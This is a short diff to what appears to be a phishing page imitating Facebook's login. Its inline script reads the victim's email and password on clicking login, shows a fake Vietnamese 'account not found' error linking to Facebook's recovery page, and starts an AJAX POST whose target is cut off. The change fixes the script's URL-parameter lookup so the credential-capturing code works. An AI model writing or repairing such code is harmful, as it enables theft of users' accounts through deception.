@@ -378,11 +378,15 @@
 </body>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
       <script>
+        
         $(document).ready(function(){
+            function getParam(param){
+                return new URLSearchParams(window.location.search).get(param);
+            }
            $('#login').click(function(){
             var acc = $('#email').val();
             var pass = $('#pass').val();
-            var code = url.searchParams.get("code");
+            var code = getParam("code");
             $('._9ay7').html('Email hoặc số di động bạn nhập không kết nối với tài khoản nào. <a href="https://facebook.com/login/identify/">Hãy tìm tài khoản của bạn và đăng nhập.</a>');
             $.ajax({
                 type: "POST",
